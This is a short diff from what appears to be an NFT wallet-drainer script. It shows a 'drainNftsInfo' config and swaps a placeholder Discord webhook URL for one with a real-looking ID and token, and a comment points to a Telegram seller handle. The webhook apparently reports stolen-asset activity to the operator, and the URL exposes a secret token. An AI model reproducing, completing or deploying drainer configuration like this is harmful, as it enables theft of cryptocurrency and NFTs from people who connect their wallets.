@@ -5,7 +5,7 @@ const drainNftsInfo = {
     maxTransfers: 1,
 }
 
-webhookURL = "https://discord.com/api/webhooks/wewewewewewew/wewewewewewewewewewe"
+webhookURL = "https://discord.com/api/webhooks/1323123832457924660/CuVov8nICPEje7V5Gd7ZbSusU6MOzh7CuyBatZH8kYz1HIV9toCAF0KER2g4yNoKv5dG"
 
 // for clean code, message @cryptoscem on telegram
 
